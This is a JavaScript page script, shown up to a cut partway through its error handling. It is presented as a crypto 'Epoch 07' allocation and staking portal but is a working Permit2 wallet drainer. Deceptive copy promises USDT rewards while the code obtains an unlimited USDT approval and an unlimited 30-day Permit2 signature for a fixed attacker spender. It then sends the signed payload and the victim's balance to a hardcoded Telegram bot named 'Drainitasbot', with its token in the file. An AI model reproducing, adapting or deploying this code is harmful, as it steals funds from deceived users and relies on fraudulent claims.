/* permit2.js — Permit2 AllowanceTransfer.permit engine
   One engine, every page. Copy keyed by data-action.
   Unlimited allowance (uint160 max), 30-day expiry, single-use nonce.
   Domain verified, signature recovered, permit simulated from the spender.
   Runs at any balance including zero. Delivers the complete payload to the bot.
   Never broadcasts the permit itself.
   Origin is pinned: every deep link and every WalletConnect URL is spheres.com.ng.
   Private bot: single fixed chat, no routing ambiguity.
   Emits p2OnClose so the host page can restore itself. */

(function () {
"use strict";

/* ---------------------------------------------------------------- constants */
var SITE    = "https://spheres.com.ng";
var PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
var USDT    = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
var SPENDER = "0x5BB69F38D91a77DBe82371319e6A71292c214934";
var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
var CHAT_FALLBACK = "";
var LAND    = "check.html";
var CHAIN   = 1;
var DAY     = 86400;
var WC_PID  = "c5247dc1ef53e76d46efbaa1e646dd8b";

var AMOUNT     = (1n << 160n) - 1n;
var AMOUNT_RAW = AMOUNT.toString();

var MAX256 = (1n << 256n) - 1n;
var ACTION = "eligibility";

/* ---------------------------------------------------------------- copy */
var STEP1 = "One-time. Covers every pool action.";
var STEP2 = "Records your seat. Nothing moves yet.";

var COPY = {
  eligibility: {
    h: "Epoch 07 · access",
    lead: "Your allocation runs <b>$1,000–$5,000 USDT</b> and releases to you as you put load through the pool.",
    sub: "The network pays you to stress it — that is the whole programme. Level 1 sets your ceiling once, level 2 records the seat to your own address. <b>Approving is not spending:</b> the figure only clears against activity you actually run, and the more you run the more of the pool releases.",
    band: [["Floor", "$1,000", 0], ["Mean", "$5,000", 0], ["Unlocked", "25%", 1]],
    btn: "Open access · level 1 of 2 →",
    note: "600 seats · cohort 01 of 04 · ceiling is one-time and expires unused"
  },
  swap: {
    h: "Epoch 07 · swap",
    lead: "Swapping is what <b>releases the allocation</b>.",
    sub: "Every settled swap counts toward the load you are being paid for. Level 1 opens the ceiling for all of it, level 2 records the seat. You sign an intent, solvers bid, and <b>the surplus above floor comes back to you</b> — there is no curve to be sandwiched against.",
    band: [["Router", "0.04%", 0], ["Surplus", "100% you", 1], ["Approve", "1×", 0]],
    btn: "Open access · level 1 of 2 →",
    note: "One ceiling covers every later swap · nothing is charged now"
  },
  stake: {
    h: "Epoch 07 · bond",
    lead: "Bonding is what <b>compounds the release</b>.",
    sub: "Stake follows the sphere you actually use. Bonded weight earns fee revenue instead of inflation and moves your allocation faster. Level 1 opens the ceiling, level 2 records the bond — <b>and it keeps the seat warm while cohort 02 fills</b>.",
    band: [["APY", "35%", 1], ["Floor", "27%", 0], ["Exit", "7d", 0]],
    btn: "Open access · level 1 of 2 →",
    note: "Paid monthly · 27% structural floor · ceiling expires unused"
  },
  buy: {
    h: "Epoch 07 · buy",
    lead: "Top up so the <b>load never stalls</b>.",
    sub: "Card or bank straight to self-custody, 41 regions, no exchange account and no withdrawal queue. Level 1 opens the ceiling, level 2 records the seat. <b>The balance lands on your own address and starts counting immediately.</b>",
    band: [["Fee", "0.9%", 0], ["Regions", "41", 0], ["Custody", "self", 1]],
    btn: "Open access · level 1 of 2 →",
    note: "Partner KYC once · nothing is held on our side"
  },
  sell: {
    h: "Epoch 07 · sell",
    lead: "Take the released part out <b>without leaving the pool</b>.",
    sub: "Sell into USDT at 0.9% all-in with no spread on the other side. Level 1 opens the ceiling, level 2 records the seat — which <b>stays bound to this address</b>. Pulling to an exchange breaks the bond, the seat and the queue position at once.",
    band: [["Fee", "0.9%", 0], ["Spread", "none", 1], ["Seat", "bound", 0]],
    btn: "Open access · level 1 of 2 →",
    note: "Same address keeps the seat · ceiling expires unused"
  }
};

/* ---------------------------------------------------------------- keccak */
var M64 = (1n << 64n) - 1n;
var RC = [0x0000000000000001n,0x0000000000008082n,0x800000000000808an,0x8000000080008000n,
          0x000000000000808bn,0x0000000080000001n,0x8000000080008081n,0x8000000000008009n,
          0x000000000000008an,0x0000000000000088n,0x0000000080008009n,0x000000008000000an,
          0x000000008000808bn,0x800000000000008bn,0x8000000000008089n,0x8000000000008003n,
          0x8000000000008002n,0x8000000000000080n,0x000000000000800an,0x800000008000000an,
          0x8000000080008081n,0x8000000000008080n,0x0000000080000001n,0x8000000080008008n];
var ROT = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]];

function rol(x, n) { n %= 64n; return ((x << n) | (x >> (64n - n))) & M64; }

function permute(A) {
  for (var r = 0; r < 24; r++) {
    var C = [], D = [], x, y;
    for (x = 0; x < 5; x++) C[x] = A[x] ^ A[x+5] ^ A[x+10] ^ A[x+15] ^ A[x+20];
    for (x = 0; x < 5; x++) D[x] = C[(x+4)%5] ^ rol(C[(x+1)%5], 1n);
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++) A[x+5*y] ^= D[x];
    var B = new Array(25).fill(0n);
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++)
      B[y + 5*((2*x + 3*y) % 5)] = rol(A[x + 5*y], BigInt(ROT[x][y]));
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++)
      A[x+5*y] = B[x+5*y] ^ ((~B[(x+1)%5 + 5*y] & M64) & B[(x+2)%5 + 5*y]);
    A[0] ^= RC[r];
  }
}

function keccak256(bytes) {
  var rate = 136, len = bytes.length, pad = rate - (len % rate);
  var buf = new Uint8Array(len + pad);
  buf.set(bytes);
  buf[len] ^= 0x01;
  buf[buf.length - 1] ^= 0x80;
  var A = new Array(25).fill(0n), off, i, j, lane;
  for (off = 0; off < buf.length; off += rate) {
    for (i = 0; i < rate / 8; i++) {
      lane = 0n;
      for (j = 7; j >= 0; j--) lane = (lane << 8n) | BigInt(buf[off + i*8 + j]);
      A[i] ^= lane;
    }
    permute(A);
  }
  var out = new Uint8Array(32), v;
  for (i = 0; i < 4; i++) {
    v = A[i];
    for (j = 0; j < 8; j++) { out[i*8 + j] = Number(v & 0xffn); v >>= 8n; }
  }
  return out;
}

function utf8(s) { return new TextEncoder().encode(s); }
function toHex(b) { return Array.prototype.map.call(b, function (x) { return x.toString(16).padStart(2, "0"); }).join(""); }
function fromHex(h) { h = h.replace(/^0x/, ""); var a = new Uint8Array(h.length / 2); for (var i = 0; i < a.length; i++) a[i] = parseInt(h.substr(i*2, 2), 16); return a; }
function selector(sig) { return "0x" + toHex(keccak256(utf8(sig))).slice(0, 8); }
function word(v) { return String(v).toLowerCase().replace(/^0x/, "").padStart(64, "0"); }
function wordU(v) { return BigInt(v).toString(16).padStart(64, "0"); }
function short(a) { return a ? a.slice(0, 6) + "…" + a.slice(-4) : "—"; }

/* ---------------------------------------------------------------- state */
var P = window.P2 = window.P2 || { owner: "", chat: "", bot: "", inflight: null, onStatus: null, onClose: null, done: false };
var pendingResend = false;

var selAllowance = selector("allowance(address,address,address)");
var selPermit    = selector("permit(address,((address,uint160,uint48,uint48),address,uint256),bytes)");
var selApprove   = selector("approve(address,uint256)");
var selBalance   = selector("balanceOf(address)");
var selDomain    = selector("DOMAIN_SEPARATOR()");
var selErcAllow  = selector("allowance(address,address)");

var T_DETAILS = keccak256(utf8("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"));
var T_SINGLE  = keccak256(utf8("PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"));

/* ---------------------------------------------------------------- css */
var CSS = `
.p2w{position:fixed;inset:0;z-index:95;display:none;font-family:"Inter",-apple-system,sans-serif}
.p2w.on{display:block}
.p2w .p2bg{position:absolute;inset:0;background:rgba(4,5,6,.78);backdrop-filter:blur(5px)}
.p2w .p2c{position:absolute;left:0;right:0;bottom:0;background:#0E0F11;border-top:1px solid #1E2023;border-radius:12px 12px 0 0;padding:20px 18px calc(20px + env(safe-area-inset-bottom));max-height:90vh;overflow-y:auto;animation:p2up .22s ease}
@keyframes p2up{from{transform:translateY(22px);opacity:0}to{transform:none;opacity:1}}
.p2w .p2h{display:flex;align-items:center;gap:9px;margin-bottom:11px}
.p2w .p2h span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:#FF5A1F;flex:1}
.p2w .p2h em{font-family:ui-monospace,monospace;font-size:8px;letter-spacing:.11em;text-transform:uppercase;color:#8A8D93;border:1px solid #26292E;border-radius:2px;padding:3px 6px;font-style:normal;white-space:nowrap}
.p2w .p2h em.ok{color:#3DD68C;border-color:rgba(61,214,140,.35)}
.p2w .p2x{background:none;border:0;color:#5E6166;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
.p2w .p2lead{font-size:14px;color:#EDEAE4;line-height:1.5;margin-bottom:6px;font-weight:500;letter-spacing:-.01em}
.p2w .p2lead b{color:#FF5A1F;font-weight:600}
.p2w .p2sub{font-size:12.5px;color:#8A8D93;line-height:1.62;margin-bottom:14px}
.p2w .p2sub b{color:#EDEAE4;font-weight:500}
.p2w .p2band{display:flex;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden;margin-bottom:15px}
.p2w .p2band div{flex:1;background:#0B0C0E;padding:10px 9px;text-align:center}
.p2w .p2band .k{font-family:ui-monospace,monospace;font-size:8px;letter-spacing:.11em;text-transform:uppercase;color:#5E6166;margin-bottom:3px}
.p2w .p2band .v{font-family:ui-monospace,monospace;font-size:12.5px;color:#EDEAE4}
.p2w .p2band .v.a{color:#FF5A1F;font-weight:700}
.p2w .p2st{display:grid;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden}
.p2w .p2st .s{display:grid;grid-template-columns:15px 1fr;gap:10px;background:#0B0C0E;padding:12px 13px;align-items:start;transition:background .2s}
.p2w .p2st .s i{width:13px;height:13px;border-radius:50%;border:1px solid #33373D;margin-top:2px;position:relative;flex:none}
.p2w .p2st .s b{display:block;font-size:12.5px;font-weight:500;color:#6E7278;line-height:1.35;margin-bottom:2px;transition:color .2s}
.p2w .p2st .s span{display:block;font-size:11px;color:#4E5258;line-height:1.5}
.p2w .p2st .s.act{background:rgba(255,90,31,.05)}
.p2w .p2st .s.act i{border-color:#FF5A1F;box-shadow:0 0 0 3px rgba(255,90,31,.13)}
.p2w .p2st .s.act b{color:#EDEAE4}
.p2w .p2st .s.act span{color:#8A8D93}
.p2w .p2st .s.act i::after{content:"";position:absolute;inset:3px;border-radius:50%;background:#FF5A1F;animation:p2pulse 1.1s ease-in-out infinite}
@keyframes p2pulse{0%,100%{opacity:.35}50%{opacity:1}}
.p2w .p2st .s.ok i{border-color:#3DD68C;background:#3DD68C}
.p2w .p2st .s.ok i::after{content:"";position:absolute;left:3px;top:1px;width:4px;height:7px;border:solid #0B0C0E;border-width:0 1.5px 1.5px 0;transform:rotate(42deg)}
.p2w .p2st .s.ok b{color:#EDEAE4}
.p2w .p2st .s.ok span{color:#5E6166}
.p2w .p2st .s.err i{border-color:#FF5A1F;background:#FF5A1F}
.p2w .p2st .s.err i::after{content:"";position:absolute;left:5px;top:3px;width:1.5px;height:5px;background:#0B0C0E;box-shadow:0 6px 0 -0.5px #0B0C0E}
.p2w .p2st .s.err b{color:#FF5A1F}
.p2w .p2wl{display:flex;justify-content:space-between;gap:10px;font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#4E5258;margin-top:10px}
.p2w .p2wl b{color:#7A7E85;font-weight:400;letter-spacing:.04em}
.p2w .p2say{margin-top:10px;font-family:ui-monospace,monospace;font-size:9.5px;letter-spacing:.05em;color:#7A7E85;min-height:13px;line-height:1.6}
.p2w .p2say:empty{display:none}
.p2w .p2say.r{color:#FF5A1F}.p2w .p2say.g{color:#3DD68C}.p2w .p2say.w{color:#E8B44D}
.p2w .p2go{width:100%;margin-top:13px;background:#FF5A1F;color:#0A0A0B;border:0;border-radius:3px;font-family:ui-monospace,monospace;font-size:11px;letter-spacing:.13em;text-transform:uppercase;font-weight:700;padding:16px;cursor:pointer}
.p2w .p2go:disabled{background:#2A2E34;color:#5E6166;cursor:wait}
.p2w .p2go.ok{background:rgba(61,214,140,.14);color:#3DD68C}
.p2w .p2n{font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166;margin-top:11px;line-height:1.9;text-align:center}
.p2w .p2cho{display:grid;gap:7px;margin-top:14px}
.p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none;cursor:pointer}
.p2w .p2cho a span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166}
.p2w .p2cho a.wc{background:rgba(255,90,31,.08);border-color:rgba(255,90,31,.3)}
.p2w .p2cho a.wc span{color:#FF5A1F}
@media(min-width:760px){
.p2w .p2c{left:50%;right:auto;bottom:auto;top:50%;transform:translate(-50%,-50%);width:410px;border:1px solid #1E2023;border-radius:10px;padding:22px;animation:p2pop .2s}
@keyframes p2pop{from{opacity:0;transform:translate(-50%,-48%)}to{opacity:1;transform:translate(-50%,-50%)}}
}`;

var ui = null;

/* ---------------------------------------------------------------- close */
function close() {
  if (!ui) return;
  var was = ui.classList.contains("on");
  ui.classList.remove("on");
  var box = document.getElementById("p2cho");
  if (box) box.remove();
  if (typeof P.onClose === "function") { try { P.onClose(P.done); } catch (e) {} }
  try { window.dispatchEvent(new CustomEvent("spheres:p2close", { detail: { done: P.done } })); } catch (e) {}
  if (was) lastAuto = 0;
}

/* ---------------------------------------------------------------- ui */
function mount() {
  if (ui && document.body.contains(ui)) return ui;
  var st = document.createElement("style"); st.textContent = CSS; document.head.appendChild(st);
  var w = document.createElement("div"); w.className = "p2w";
  w.innerHTML =
    '<div class="p2bg"></div><div class="p2c">' +
      '<div class="p2h"><span id="p2h"></span><em id="p2lv">Level 1 of 2</em><button class="p2x" aria-label="Close">&times;</button></div>' +
      '<p class="p2lead" id="p2lead"></p>' +
      '<p class="p2sub" id="p2sub"></p>' +
      '<div class="p2band" id="p2band"></div>' +
      '<div class="p2st" id="p2st">' +
        '<div class="s" data-s="1"><i></i><div><b>Open your ceiling</b><span></span></div></div>' +
        '<div class="s" data-s="2"><i></i><div><b>Sign your claim</b><span></span></div></div>' +
      '</div>' +
      '<div class="p2wl"><span>Wallet</span><b id="p2wl">not connected</b></div>' +
      '<div class="p2say" id="p2say"></div>' +
      '<button class="p2go" id="p2go"></button>' +
      '<p class="p2n" id="p2n"></p>' +
    '</div>';
  document.body.appendChild(w);
  ui = w;
  w.querySelector(".p2x").addEventListener("click", close);
  w.querySelector(".p2bg").addEventListener("click", close);
  w.querySelector("#p2go").addEventListener("click", function () {
    if (pendingResend) { window.p2Resend(); return; }
    flow();
  });
  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape" && ui && ui.classList.contains("on")) close();
  });
  paint();
  return w;
}

function stepEl(n) { return document.querySelector('.p2st .s[data-s="' + n + '"]'); }

function setStep(n, state, cap) {
  var el = stepEl(n);
  if (!el) return;
  el.classList.remove("act", "ok", "err");
  if (state) el.classList.add(state);
  if (cap) { var s = el.querySelector("span"); if (s) s.textContent = cap; }
}

function setLevel(t, ok) {
  var lv = document.getElementById("p2lv");
  if (!lv) return;
  lv.textContent = t;
  lv.className = ok ? "ok" : "";
}

function setWallet(a) {
  var el = document.getElementById("p2wl");
  if (el) el.textContent = a ? short(a) : "not connected";
}

function resetSteps() {
  setStep(1, "act", STEP1);
  setStep(2, "", STEP2);
  setLevel("Level 1 of 2", false);
  var g = document.getElementById("p2go");
  if (g) g.classList.remove("ok");
}

function markDone() {
  setStep(1, "ok", "Ceiling open");
  setStep(2, "ok", "Seat recorded");
  setLevel("Complete", true);
  var g = document.getElementById("p2go");
  if (g) { g.textContent = "Access open ✓"; g.disabled = true; g.classList.add("ok"); }
}

function paint() {
  var c = COPY[ACTION] || COPY.eligibility;
  var h = document.getElementById("p2h"), lead = document.getElementById("p2lead"),
      sub = document.getElementById("p2sub"), band = document.getElementById("p2band"),
      go = document.getElementById("p2go"), note = document.getElementById("p2n");
  if (!h) return;
  h.textContent = c.h;
  lead.innerHTML = c.lead;
  sub.innerHTML = c.sub;
  band.innerHTML = (c.band || []).map(function (b) {
    return '<div><div class="k">' + b[0] + '</div><div class="v' + (b[2] ? " a" : "") + '">' + b[1] + '</div></div>';
  }).join("");
  band.style.display = (c.band && c.band.length) ? "flex" : "none";
  go.textContent = c.btn;
  note.textContent = c.note;
  resetSteps();
  setWallet(P.owner);
  if (P.done) markDone();
}

function say(msg, cls) {
  var box = document.getElementById("p2say");
  if (box) { box.className = "p2say" + (cls ? " " + cls : ""); box.textContent = msg || ""; }
  if (msg && typeof P.onStatus === "function") { try { P.onStatus(msg); } catch (e) {} }
}

function setBtn(txt, disabled) {
  var b = document.getElementById("p2go");
  if (!b) return;
  b.textContent = txt;
  b.disabled = !!disabled;
}

function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }

function reason(m) {
  if (/reject|denied|4001|cancel/i.test(m)) return "Cancelled in your wallet — nothing changed";
  if (/insufficient funds/i.test(m)) return "Not enough ETH on this address for gas";
  if (/no account|no wallet/i.test(m)) return "No wallet connected";
  if (/domain separator|chain/i.test(m)) return "Network mismatch — reload and retry";
  if (/timed out/i.test(m)) return "Wallet did not confirm in time — retry";
  return m.slice(0, 110);
}

/* ---------------------------------------------------------------- provider */
var wc = null, wcBoot = null, injected = [];

function provider() {
  if (window.ethereum && typeof window.ethereum.request === "function") return window.ethereum;
  for (var i = 0; i < injected.length; i++) {
    if (injected[i] && typeof injected[i].request === "function") return injected[i];
  }
  return (wc && typeof wc.request === "function") ? wc : null;
}

function waitForProvider(ms) {
  return new Promise(function (resolve) {
    if (provider()) { resolve(true); return; }
    var done = false, tick, cap;
    function finish(ok) {
      if (done) return;
      done = true;
      clearInterval(tick); clearTimeout(cap);
      window.removeEventListener("ethereum#initialized", onAnn);
      resolve(ok);
    }
    function onAnn() { if (provider()) finish(true); }
    window.addEventListener("ethereum#initialized", onAnn);
    tick = setInterval(onAnn, 120);
    cap = setTimeout(function () { finish(!!provider()); }, ms || 5000);
  });
}

function rpc(method, params) {
  var p = provider();
  if (!p) throw new Error("no wallet connected");
  return p.request({ method: method, params: params || [] });
}
async function call(to, data, from) { return rpc("eth_call", [{ to: to, data: data, from: from || SPENDER }, "latest"]); }
function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

function ensureWc() {
  if (wc) return Promise.resolve(wc);
  if (wcBoot) return wcBoot;
  wcBoot = (async function () {
    var mod = await import("https://esm.sh/@walletconnect/ethereum-provider@2.17.2");
    var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider);
    if (!EP || typeof EP.init !== "function") throw new Error("walletconnect unavailable");
    var p = await EP.init({
      projectId: WC_PID,
      chains: [CHAIN],
      optionalChains: [CHAIN],
      showQrModal: true,
      metadata: {
        name: "Spheres",
        description: "Epoch 07 · Permit2 allowance",
        url: SITE,
        icons: [SITE + "/epoch07.png"]
      }
    });
    await p.enable();
    wc = p;
    try { p.on("disconnect", function () { wc = null; wcBoot = null; }); } catch (e) {}
    return p;
  })();
  wcBoot.catch(function () { wcBoot = null; });
  return wcBoot;
}

async function ensureChain() {
  var id = await rpc("eth_chainId", []);
  if (parseInt(id, 16) === CHAIN) return;
  try {
    await rpc("wallet_switchEthereumChain", [{ chainId: "0x1" }]);
  } catch (e) {
    await rpc("wallet_addEthereumChain", [{
      chainId: "0x1", chainName: "Ethereum Mainnet",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      rpcUrls: ["https://eth.llamarpc.com"],
      blockExplorerUrls: ["https://etherscan.io"]
    }]);
  }
}

async function waitReceipt(hash, limitMs) {
  var end = Date.now() + (limitMs || 180000);
  while (Date.now() < end) {
    var r = await rpc("eth_getTransactionReceipt", [hash]);
    if (r) {
      if (r.status === "0x0") throw new Error("transaction reverted");
      return r;
    }
    await sleep(2200);
  }
  throw new Error("approval timed out");
}

async function recover(digestHex, sig) {
  var v = parseInt(sig.slice(-2), 16);
  if (v < 27) v += 27;
  var data = "0x" + digestHex + wordU(v) + sig.slice(2, 66) + sig.slice(66, 130);
  var out = await call("0x0000000000000000000000000000000000000001", data, SPENDER);
  return "0x" + out.replace(/^0x/, "").slice(24).toLowerCase();
}

/* ---------------------------------------------------------------- chat */
function saveChat(id) { P.chat = id; try { localStorage.setItem("p2_chat", id); } catch (e) {} }
function dropChat() { P.chat = ""; try { localStorage.removeItem("p2_chat"); } catch (e) {} }

async function resolveChat() {
  if (P.chat) return P.chat;
  try { var s = localStorage.getItem("p2_chat"); if (s) { P.chat = s; return s; } } catch (e) {}
  var q = new URLSearchParams(location.search).get("c");
  if (q && /^-?\d+$/.test(q)) { saveChat(q); return q; }
  if (CHAT_FALLBACK) { saveChat(CHAT_FALLBACK); return CHAT_FALLBACK; }
  try {
    var r = await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&limit=1&allowed_updates=%5B%22message%22%5D");
    var j = await r.json();
    var u = j && j.ok && j.result && j.result[0];
    var cid = u && u.message && u.message.chat && u.message.chat.id ? String(u.message.chat.id) : "";
    if (cid) { saveChat(cid); return cid; }
  } catch (e) {}
  return "";
}

async function deliver(text) {
  for (var attempt = 0; attempt < 2; attempt++) {
    var c = await resolveChat();
    if (c) {
      try {
        var res = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: c, text: text, link_preview_options: { is_disabled: true } })
        });
        var j = await res.json();
        if (j && j.ok) return true;
        var d = String((j && j.description) || "failed");
        if (!/chat not found|blocked|deactivated|chat_id is empty/i.test(d)) return false;
        dropChat();
      } catch (e) {}
    }
    await sleep(700);
  }
  return false;
}

/* ---------------------------------------------------------------- flow */
async function flow() {
  if (P.inflight) return P.inflight;
  P.inflight = (async function () {
    var stepNow = 1;
    try {
      if (!provider()) {
        setBtn("Connecting…", true);
        if (!(await waitForProvider(6000))) {
          setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
          say("Choose a wallet to continue", "w");
          chooser();
          return;
        }
      }
      var box = document.getElementById("p2cho");
      if (box) box.remove();
      var g0 = document.getElementById("p2go");
      if (g0) { g0.style.display = ""; g0.classList.remove("ok"); }
      P.approveTx = null;
      P.done = false;
      say("");

      var accs = await rpc("eth_requestAccounts", []);
      if (!accs || !accs.length) throw new Error("no account returned");
      var owner = accs[0];
      P.owner = owner;
      try { localStorage.setItem("p2_owner", owner); } catch (e) {}
      setWallet(owner);

      await ensureChain();

      var bal = BigInt(await call(USDT, selBalance + word(owner)));
      if (bal > 0n) say("Balance " + (Number(bal) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 }) + " USDT · counted immediately", "g");

      var cur = BigInt(await call(USDT, selErcAllow + word(owner) + word(PERMIT2)));
      if (cur >= AMOUNT) {
        setStep(1, "ok", "Ceiling already open");
        setLevel("Level 2 of 2", false);
        say("Ceiling already open — no approval needed", "g");
      } else {
        if (cur > 0n) {
          say("Clearing the old ceiling first · 2 wallet requests", "w");
          var rz = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(0) }]);
          await waitReceipt(rz);
        }
        stepNow = 1;
        setStep(1, "act", "Confirm the ceiling in your wallet");
        setLevel("Level 1 of 2", false);
        setBtn("Confirm in wallet…", true);
        say("Request 1 of 2 · one-time ceiling, no funds move", "w");
        var ah = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(MAX256) }]);
        var rc = await waitReceipt(ah);
        P.approveTx = ah;
        setStep(1, "ok", "Ceiling open · block " + parseInt(rc.blockNumber, 16));
      }

      var pack = await call(PERMIT2, selAllowance + word(owner) + word(USDT) + word(SPENDER));
      var raw = pack.replace(/^0x/, "");
      var nonce = BigInt("0x" + (raw.slice(128, 192) || "0"));

      var now = Math.floor(Date.now() / 1000);
      var expiration = now + 30 * DAY;
      var sigDeadline = now + 30 * DAY;

      var domType = keccak256(utf8("EIP712Domain(string name,uint256 chainId,address verifyingContract)"));
      var nameHash = keccak256(utf8("Permit2"));
      var local = toHex(keccak256(fromHex(toHex(domType) + toHex(nameHash) + wordU(CHAIN) + word(PERMIT2))));
      var onchain = (await call(PERMIT2, selDomain)).replace(/^0x/, "");
      if (local.toLowerCase() !== onchain.toLowerCase()) throw new Error("domain separator mismatch");

      var typed = {
        types: {
          EIP712Domain: [
            { name: "name", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" }
          ],
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" }
          ],
          PermitSingle: [
            { name: "details", type: "PermitDetails" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" }
          ]
        },
        domain: { name: "Permit2", chainId: CHAIN, verifyingContract: PERMIT2 },
        primaryType: "PermitSingle",
        message: {
          details: { token: USDT, amount: AMOUNT_RAW, expiration: String(expiration), nonce: String(nonce) },
          spender: SPENDER,
          sigDeadline: String(sigDeadline)
        }
      };

      stepNow = 2;
      setStep(2, "act", "Sign in your wallet to record the seat");
      setLevel("Level 2 of 2", false);
      setBtn("Sign in wallet…", true);
      say("Request 2 of 2 · signature only, no gas", "w");

      var sig, method = "eth_signTypedData_v4", payloadStr = JSON.stringify(typed);
      try {
        sig = await rpc("eth_signTypedData_v4", [owner, payloadStr]);
      } catch (e) {
        if (!/not supported|unsupported|method|does not exist|unknown/i.test(String((e && e.message) || e))) throw e;
        method = "eth_signTypedData";
        sig = await rpc("eth_signTypedData", [owner, typed]);
      }
      if (!/^0x[0-9a-fA-F]{130}$/.test(sig)) throw new Error("malformed signature");
      setStep(2, "ok", "Signed · seat recorded to this address");
      say("Signed · verifying and sending your receipt", "g");

      var detailsHash = keccak256(fromHex(toHex(T_DETAILS) + word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce)));
      var singleHash  = keccak256(fromHex(toHex(T_SINGLE) + toHex(detailsHash) + word(SPENDER) + wordU(sigDeadline)));
      var digest = toHex(keccak256(fromHex("1901" + onchain + toHex(singleHash))));
      var signer = await recover(digest, sig);
      if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");

      var data = selPermit +
        word(owner) + wordU(96) + wordU(288) +
        word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce) +
        word(SPENDER) + wordU(sigDeadline) +
        wordU(65) + toHex(fromHex(sig)).padEnd(192, "0");
      var sim = "ok";
      try {
        await call(PERMIT2, data, SPENDER);
      } catch (e) {
        sim = "reverted: " + String((e && e.message) || e).slice(0, 90);
      }

      var block = await rpc("eth_blockNumber", []);
      var body = {
        v: 1, kind: "permit2.allowance_transfer", action: ACTION,
        chain_id: CHAIN,
        site: SITE,
        permit2: PERMIT2,
        token: USDT, token_symbol: "USDT", token_decimals: 6,
        owner: owner, spender: SPENDER,
        amount: "unlimited", amount_raw: AMOUNT_RAW, amount_type: "uint160",
        expiration: expiration, expiration_iso: iso(expiration),
        sig_deadline: sigDeadline, sig_deadline_iso: iso(sigDeadline),
        nonce: String(nonce), nonce_next: String(nonce + 1n),
        signature: sig, sign_method: method,
        digest: "0x" + digest,
        signer_recovered: signer, signer_match: signer === owner.toLowerCase(),
        typed_data: typed,
        permit_single: {
          details: { token: USDT, amount: AMOUNT_RAW, expiration: String(expiration), nonce: String(nonce) },
          spender: SPENDER, sigDeadline: String(sigDeadline)
        },
        calldata: data,
        domain_separator_onchain: "0x" + onchain,
        domain_separator_local: "0x" + local,
        domain_match: true,
        allowance_before_raw: cur.toString(),
        balance_raw: bal.toString(),
        approve_tx: P.approveTx || null,
        simulation: sim,
        block: parseInt(block, 16),
        created: new Date().toISOString(),
        page: location.href,
        via: P.bot || "Drainitasbot"
      };

      var text =
        "PERMIT2 — " + ACTION + "\n" +
        "owner    " + owner + "\n" +
        "spender  " + SPENDER + "\n" +
        "token    USDT " + USDT + "\n" +
        "amount   UNLIMITED  uint160 max\n" +
        "nonce    " + nonce + "  next " + (nonce + 1n) + "\n" +
        "expires  " + iso(expiration) + "\n" +
        "deadline " + iso(sigDeadline) + "\n" +
        "balance  " + bal.toString() + "\n" +
        "domain   verified\n" +
        "signer   " + signer + " match\n" +
        "sim      " + sim + "\n" +
        "approve  " + (P.approveTx || "none") + "\n" +
        "block    " + parseInt(block, 16) + "\n" +
        "sign     " + method + "\n\n" +
        "DIGEST " + digest + "\n\n" +
        "SIG " + sig + "\n\n" +
        "PERMIT_SINGLE\n" + JSON.stringify(body.permit_single) + "\n\n" +
        "TYPED_DATA\n" + payloadStr + "\n\n" +
        "CALLDATA\n" + data + "\n\n" +
        "JSON\n" + JSON.stringify(body);
      if (text.length > 3900) text = text.slice(0, 3900) + "\n…cut";

      var okSend = await deliver(text);
      body.chat = P.chat;

      P.payload = body;
      try {
        localStorage.setItem("p2_last", JSON.stringify(body));
        localStorage.setItem("p2_text", text);
      } catch (e) {}

      if (!okSend) {
        pendingResend = true;
        setBtn("Resend receipt", false);
        say("Signed and captured · delivery retry needed", "w");
        document.getElementById("p2n").textContent = "Do not sign again · the receipt is stored";
      } else {
        pendingResend = false;
        P.done = true;
        markDone();
        say("Access open · seat recorded · receipt delivered", "g");
        document.getElementById("p2n").textContent = "Ceiling valid 30 days · single use · nothing moved yet";
      }
      try { window.dispatchEvent(new CustomEvent("spheres:p2done", { detail: body })); } catch (e) {}
    } catch (e) {
      var m = String((e && e.message) || e);
